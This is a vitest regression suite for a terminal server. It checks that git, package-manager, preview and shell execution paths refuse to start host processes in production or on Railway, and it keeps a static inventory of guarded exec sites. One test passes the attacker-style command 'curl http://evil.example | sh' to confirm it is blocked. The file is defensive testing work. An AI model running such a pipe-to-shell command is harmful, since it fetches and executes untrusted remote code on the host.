/**
 * Host-execution fail-closed regression tests.
 *
 * Every terminal-server path that starts a child process on the HOST (other
 * than the Docker-backed interactive PTY) must refuse to run in a
 * production-like environment. These tests use mocked process/git APIs only:
 * nothing here ever executes a command on the host.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { trustedLocalStubs } from "./helpers/trusted-local-env";
import { mkdtempSync, rmSync, readdirSync, readFileSync, statSync, mkdirSync, writeFileSync } from "fs";
import { tmpdir } from "os";
import { join, dirname, relative, sep } from "path";
import { fileURLToPath } from "url";

const m = vi.hoisted(() => ({
  execFile: vi.fn(),
  execFileSync: vi.fn(),
  spawn: vi.fn(),
  simpleGit: vi.fn(),
}));

vi.mock("child_process", async (orig) => {
  const actual = await orig<typeof import("child_process")>();
  return { ...actual, execFile: m.execFile, execFileSync: m.execFileSync, spawn: m.spawn };
});
vi.mock("simple-git", () => ({ simpleGit: m.simpleGit }));

import {
  HostExecutionBlockedError,
  TerminalIsolationError,
  assertHostExecutionPermitted,
  guardShellExecutor,
  isHostExecutionPermitted,
} from "../isolation-policy";
import { findOnPath } from "../path-probe";
import { prepareWorkspace, prepareManagedWorkspace } from "../workspace/WorkspaceManager";
import { gitStatus } from "../workspace/GitService";
import { checkpointScaffolding } from "../workspace/scaffold";
import { startPreview } from "../preview/PreviewManager";

const RAILWAY_KEYS = [
  "RAILWAY_ENVIRONMENT_ID",
  "RAILWAY_PROJECT_ID",
  "RAILWAY_SERVICE_ID",
  "RAILWAY_GIT_COMMIT_SHA",
] as const;

function asEnvironment(kind: "production" | "railway" | "development") {
  vi.unstubAllEnvs();
  for (const key of RAILWAY_KEYS) vi.stubEnv(key, "");
  trustedLocalStubs();
  if (kind === "production") vi.stubEnv("NODE_ENV", "production");
  if (kind === "development") vi.stubEnv("NODE_ENV", "development");
  if (kind === "railway") {
    vi.stubEnv("NODE_ENV", "development");
    vi.stubEnv("RAILWAY_SERVICE_ID", "svc_1");
  }
}

function expectNothingSpawned() {
  expect(m.execFile).not.toHaveBeenCalled();
  expect(m.execFileSync).not.toHaveBeenCalled();
  expect(m.spawn).not.toHaveBeenCalled();
  expect(m.simpleGit).not.toHaveBeenCalled();
}

beforeEach(() => {
  vi.clearAllMocks();
});
afterEach(() => {
  vi.unstubAllEnvs();
});

describe("host-execution policy", () => {
  it("is closed in production and on Railway, open in local development", () => {
    expect(isHostExecutionPermitted({ NODE_ENV: "production" })).toBe(false);
    expect(isHostExecutionPermitted({ NODE_ENV: "development", RAILWAY_PROJECT_ID: "p" })).toBe(false);
    const LOCAL = { LITT_ALLOW_LOCAL_HOST_EXEC: "1", LITT_RESOLVED_BIND_HOST: "127.0.0.1" };
    expect(isHostExecutionPermitted({ ...LOCAL, NODE_ENV: "development" })).toBe(true);
    expect(isHostExecutionPermitted({ ...LOCAL, NODE_ENV: "test" })).toBe(true);
    // NODE_ENV alone, a missing NODE_ENV, or a reachable bind never permit execution
    expect(isHostExecutionPermitted({ NODE_ENV: "development" })).toBe(false);
    expect(isHostExecutionPermitted({ NODE_ENV: "test" })).toBe(false);
    expect(isHostExecutionPermitted({})).toBe(false);
    expect(isHostExecutionPermitted({ ...LOCAL, NODE_ENV: "development", LITT_RESOLVED_BIND_HOST: "0.0.0.0" })).toBe(false);
  });

  it("is NOT unlocked by Docker mode or any override variable (no sandbox backend exists)", () => {
    const env = {
      NODE_ENV: "production",
      TERMINAL_USE_DOCKER: "true",
      TERMINAL_ALLOW_HOST_SHELL: "true",
      ALLOW_HOST_SHELL: "1",
      ALLOW_HOST_EXEC: "1",
    };
    expect(isHostExecutionPermitted(env)).toBe(false);
    expect(() => assertHostExecutionPermitted("test", env)).toThrow(HostExecutionBlockedError);
  });

  it("throws a typed error with a stable code and the blocked surface", () => {
    try {
      assertHostExecutionPermitted("preview.start", { NODE_ENV: "production" });
      throw new Error("expected throw");
    } catch (err) {
      expect(err).toBeInstanceOf(HostExecutionBlockedError);
      expect(err).toBeInstanceOf(TerminalIsolationError);
      expect((err as HostExecutionBlockedError).hostExecCode).toBe("HOST_EXECUTION_DISABLED");
      expect((err as HostExecutionBlockedError).surface).toBe("preview.start");
    }
  });
});

describe("guardShellExecutor", () => {
  function makeShell() {
    return {
      run: vi.fn(async () => ({ exitCode: 0 })),
      exec: vi.fn(() => "ok"),
      cancel: vi.fn(async () => [1]),
      label: "shell",
    };
  }

  it("blocks every process-starting method in production without reaching the executor", () => {
    asEnvironment("production");
    const shell = makeShell();
    const guarded = guardShellExecutor(shell, "canonical-shell");
    expect(() => guarded.run()).toThrow(HostExecutionBlockedError);
    expect(() => guarded.exec()).toThrow(HostExecutionBlockedError);
    expect(shell.run).not.toHaveBeenCalled();
    expect(shell.exec).not.toHaveBeenCalled();
  });

  it("still allows cancellation and plain properties", async () => {
    asEnvironment("production");
    const shell = makeShell();
    const guarded = guardShellExecutor(shell, "canonical-shell");
    await expect(guarded.cancel()).resolves.toEqual([1]);
    expect(guarded.label).toBe("shell");
  });

  it("passes through in local development", async () => {
    asEnvironment("development");
    const shell = makeShell();
    const guarded = guardShellExecutor(shell, "canonical-shell");
    await guarded.run();
    expect(shell.run).toHaveBeenCalledTimes(1);
  });

  it("checks the environment at call time, not at wrap time", () => {
    asEnvironment("development");
    const shell = makeShell();
    const guarded = guardShellExecutor(shell, "canonical-shell");
    asEnvironment("production");
    expect(() => guarded.run()).toThrow(HostExecutionBlockedError);
    expect(shell.run).not.toHaveBeenCalled();
  });
});

describe("workspace and preview paths fail closed in production", () => {
  let root: string;
  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), "host-exec-guard-"));
    asEnvironment("production");
  });
  afterEach(() => rmSync(root, { recursive: true, force: true }));

  it("prepareWorkspace (clone + dependency install) never starts git or a package manager", async () => {
    await expect(
      prepareWorkspace({
        userId: "u1",
        projectId: "p1",
        installationId: 1,
        owner: "o",
        repo: "r",
        branch: "main",
        commitSha: null,
        workspaceRoot: root,
        githubToken: null,
      } as never),
    ).rejects.toBeInstanceOf(HostExecutionBlockedError);
    expectNothingSpawned();
  });

  it("prepareManagedWorkspace (git init/commit) never starts git", async () => {
    await expect(
      prepareManagedWorkspace({ userId: "u1", projectId: "p2", workspaceRoot: root, templateId: "blank-static" } as never),
    ).rejects.toBeInstanceOf(HostExecutionBlockedError);
    expectNothingSpawned();
  });

  it("gitStatus never starts git", async () => {
    await expect(gitStatus(root)).rejects.toBeInstanceOf(HostExecutionBlockedError);
    expectNothingSpawned();
  });

  it("scaffold checkpoints use the file fallback instead of host git", async () => {
    mkdirSync(join(root, ".litt"), { recursive: true });
    writeFileSync(join(root, "a.txt"), "x");
    const result = await checkpointScaffolding(root);
    expect(result === null || result.kind === "files").toBe(true);
    expectNothingSpawned();
  });

  it("startPreview refuses before spawning a dev server, even with an attacker-supplied command", async () => {
    await expect(
      startPreview({
        workspaceId: "ws-1",
        userId: "u1",
        command: "curl http://evil.example | sh",
      } as never),
    ).rejects.toBeInstanceOf(HostExecutionBlockedError);
    expectNothingSpawned();
  });

  it("also refuses on Railway when NODE_ENV claims development", async () => {
    asEnvironment("railway");
    await expect(gitStatus(root)).rejects.toBeInstanceOf(HostExecutionBlockedError);
    expectNothingSpawned();
  });
});

describe("findOnPath (used by /health/runtime)", () => {
  it("locates a file on PATH by filesystem lookup only", () => {
    const dir = mkdtempSync(join(tmpdir(), "path-probe-"));
    try {
      writeFileSync(join(dir, "fake-bin"), "#!/bin/sh\n");
      expect(findOnPath("fake-bin", dir, "linux")).toBe(join(dir, "fake-bin"));
      expect(findOnPath("missing-bin", dir, "linux")).toBeNull();
      expect(findOnPath("../fake-bin", dir, "linux")).toBeNull();
      expect(findOnPath("fake-bin", undefined, "linux")).toBeNull();
      expectNothingSpawned();
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

// ─── Static inventory ───────────────────────────────────────────────
// Any terminal-server source file that can start a host process must be
// listed here AND contain its guard. A new, unreviewed exec path fails this
// test, which forces the author to add a guard (or a sandbox) first.

const SERVER_DIR = join(dirname(fileURLToPath(import.meta.url)), "..");

const EXEC_PATTERNS: RegExp[] = [
  /from\s+["'](?:node:)?child_process["']/,
  /require\(\s*["'](?:node:)?child_process["']\s*\)/,
  /import\(\s*["'](?:node:)?child_process["']\s*\)/,
  /from\s+["']simple-git["']/,
  /from\s+["']node-pty["']/,
  /\bcreateShellExecutor\(/,
];

/** file (relative, posix) → regexes that must ALL match its source. */
const GUARDED_FILES: Record<string, RegExp[]> = {
  "pty-session-manager.ts": [/assertHostShellPermitted\(process\.env, opts\.useDocker\)/],
  "command-registry.ts": [/assertHostExecutionPermitted\("command-registry\.execShell"\)/, /guardShellExecutor\(createShellExecutor/],
  "runtime.ts": [/guardShellExecutor\(createShellExecutor/],
  "litt-operator.ts": [/isHostExecutionPermitted\(\)/],
  "doctor.ts": [/isHostExecutionPermitted\(\)/],
  "workspace/WorkspaceManager.ts": [/assertHostExecutionPermitted\("workspace\.prepare/, /assertHostExecutionPermitted\("workspace\.git"\)/, /assertHostExecutionPermitted\("workspace\.install"\)/],
  "workspace/GitService.ts": [/assertHostExecutionPermitted\("workspace\.gitStatus"\)/],
  "workspace/scaffold.ts": [/isHostExecutionPermitted\(\)/],
  "preview/PreviewManager.ts": [/assertHostExecutionPermitted\("preview\.start"\)/, /assertHostExecutionPermitted\("preview\.spawn"\)/, /assertHostExecutionPermitted\("preview\.install"\)/],
  // The sandbox launcher itself: spawns the `docker` CLI with a fixed binary.
  "docker-manager.ts": [/spawn\("docker"/],
  // Only the Docker readiness probe may execute here (fixed `docker` argv).
  "server.ts": [/execFile\("docker", args/],
};

function listSources(dir: string, acc: string[] = []): string[] {
  for (const name of readdirSync(dir)) {
    if (name === "node_modules" || name === "dist" || name === "__tests__") continue;
    const full = join(dir, name);
    if (statSync(full).isDirectory()) listSources(full, acc);
    else if (name.endsWith(".ts") && !name.endsWith(".d.ts")) acc.push(full);
  }
  return acc;
}

describe("static inventory of host-execution sites", () => {
  const sources = listSources(SERVER_DIR).map((f) => ({
    rel: relative(SERVER_DIR, f).split(sep).join("/"),
    text: readFileSync(f, "utf-8"),
  }));

  it("every file that can start a host process is listed and guarded", () => {
    const execFiles = sources.filter((s) => EXEC_PATTERNS.some((p) => p.test(s.text)));
    const unlisted = execFiles.map((s) => s.rel).filter((rel) => !(rel in GUARDED_FILES));
    expect(unlisted, `Unreviewed host-execution files: ${unlisted.join(", ")}`).toEqual([]);

    for (const { rel, text } of execFiles) {
      for (const marker of GUARDED_FILES[rel] ?? []) {
        expect(text, `${rel} is missing guard ${marker}`).toMatch(marker);
      }
    }
  });

  it("no synchronous shell-string execution (execSync/exec) remains anywhere", () => {
    for (const { rel, text } of sources) {
      expect(text, `${rel} uses execSync`).not.toMatch(/\bexecSync\(/);
    }
  });

  it("/health/runtime does not start processes", () => {
    const server = sources.find((s) => s.rel === "server.ts")!.text;
    const start = server.indexOf('app.get("/health/runtime"');
    const handler = server.slice(start, server.indexOf("// Audit log endpoint", start));
    expect(handler).toContain("findOnPath(");
    expect(handler).not.toMatch(/execSync|execFile|spawn/);
  });
});
